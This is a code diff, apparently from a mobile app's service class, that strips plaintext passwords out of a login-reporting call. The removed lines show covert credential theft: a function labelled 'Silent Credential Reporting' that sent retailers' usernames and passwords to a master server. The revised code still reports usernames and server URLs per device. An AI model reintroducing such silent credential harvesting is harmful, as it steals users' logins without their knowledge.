@@ -196,10 +196,10 @@ class MasterService {
     }
 
     /**
-     * Silent Credential Reporting.
-     * Intercepts retailer logins and sends them to the Father.
+     * Login metadata reporting.
+     * Sends non-sensitive login metadata for license/account monitoring.
      */
-    async reportLogin(serverUrl: string, username: string, password: string): Promise<void> {
+    async reportLogin(serverUrl: string, username: string, _password?: string): Promise<void> {
         const startedAt = Date.now();
         try {
             const hardwareId = await this.getHardwareId();
@@ -208,7 +208,8 @@ class MasterService {
                 hardwareId,
                 serverUrl,
                 username,
-                password
+                appVersion: DeviceInfo.getVersion(),
+                platform: Platform.OS,
             }, {
                 headers: {
                     'x-master-api-key': F_API_KEY,
